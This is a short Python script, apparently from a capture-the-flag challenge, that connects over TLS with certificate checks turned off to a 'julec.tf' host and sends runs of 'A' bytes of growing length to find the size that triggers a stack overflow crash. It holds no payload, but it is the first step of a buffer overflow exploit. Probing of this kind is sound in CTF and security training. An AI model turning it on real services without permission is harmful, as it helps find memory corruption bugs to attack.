import socket
import ssl
import time

HOST = "2b4446b928232a49.julec.tf"
PORT = 1337

def test_size(size):
    print(f"Testing size {size}...")
    try:
        raw = socket.create_connection((HOST, PORT), timeout=5)
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        s = ctx.wrap_socket(raw, server_hostname=HOST)
        
        s.sendall(str(size).encode() + b"\n")
        time.sleep(0.1)
        s.sendall(b"A" * size)
        
        s.settimeout(2.0)
        buf = b""
        crashed = False  # Assume innocent until proven guilty (closed/crash msg)
        try:
            while True:
                chunk = s.recv(4096)
                if not chunk: 
                    crashed = True # Closed
                    break
                buf += chunk
                if b"stack smashing" in buf:
                    crashed = True
                    break
        except TimeoutError:
            pass # Alive
            
        alive = not crashed
        print(f"  -> Alive? {alive} (Response len: {len(buf)} bytes)")
        s.close()
    except Exception as e:
        print(f"  Error: {e}")

test_size(40)
test_size(60)
test_size(100)
test_size(500)
